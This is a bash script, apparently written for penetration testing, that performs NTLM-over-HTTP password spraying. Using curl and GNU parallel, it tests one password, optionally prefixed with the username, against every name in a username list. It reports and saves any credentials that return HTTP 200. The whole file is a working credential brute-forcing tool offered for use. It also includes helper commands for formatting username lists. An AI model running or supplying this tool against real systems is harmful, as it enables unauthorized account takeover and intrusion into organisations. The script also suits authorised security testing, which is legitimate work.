!/bin/bash
# ntlm-http-brute v0.1 by James Gallagher
# This is a crude tool for password spraying NTLM over HTTP. Currently it doesn't know how to handle dropped connections so be aware of that.
# Syntax: ntlm-http-brute.sh <URL> <threads> <username-input-file> <toggle prepend username off or on with 0 or 1 respectively> <password>  
# Example: ntlm-http-brute.sh https://example.com/page-that-prompts-for-ntlm-auth 8 list-of-usernames.txt 0 Password123
# Tested on Kali Linux 2023.3
# This tool requires parallel: apt install parallel
# If you want the first letter or letters of each username in your username file capitalized for use with the prepend option, try this:
# cat usernames-test.txt | tr [:upper:] [:lower:] | sed -e 's/^./\U&/' > usernames-new.txt # John 
# cat usernames-test.txt | tr [:upper:] [:lower:] | sed -e 's/^../\U&/' > usernames-new.txt # JDoe  
# cat usernames-test.txt | tr [:upper:] [:lower:] | sed -e 's/^.../\U&/' > usernames-new.txt # JMDoe
export url=$1
threads=$2
usernames=$3
prepend=$4  
export password=$5
export output=./ntlm-http-brute-results.txt
echo
echo ntlm-http-brute v0.1
echo
echo Beginning NTLM over HTTP brute force attack...
echo
brute() {
  i="$1" 
  echo Testing $i:$password
  curl -v -s $url --ntlm -u $i:$password 2>&1 | grep -q '200 OK' && echo VALID CREDENTIALS FOUND: $i:$password - see $output for all results && echo $i:$password >> $output
}
bruteprepend() {
  i="$1"
  echo Testing $i:$i$password
  curl -v -s $url --ntlm -u $i:$i$password 2>&1 | grep -q '200 OK' && echo VALID CREDENTIALS FOUND: $i:$i$password - see $output for all results && echo $i:$i$password >> $output
}
export -f brute
export -f bruteprepend   
if [ $prepend = 1 ]; then
        echo Prepending username to password...
        echo WARNING if you want the first letter of each username capitalized you should do that yourself first using the command in the comments of this script
        echo
        parallel -j$2 bruteprepend <$usernames
else
        parallel -j$2 brute <$usernames
fi
echo
echo List of valid credentials, if any:
cat $output
echo
echo DONE - results saved to $output
